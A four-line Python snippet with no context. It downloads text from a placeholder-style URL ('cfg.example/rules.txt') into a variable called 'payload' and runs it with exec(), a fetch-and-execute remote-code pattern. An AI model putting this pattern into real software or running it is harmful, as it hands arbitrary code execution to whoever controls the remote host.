import urllib.request

payload = urllib.request.urlopen("https://cfg.example/rules.txt").read()
exec(payload)
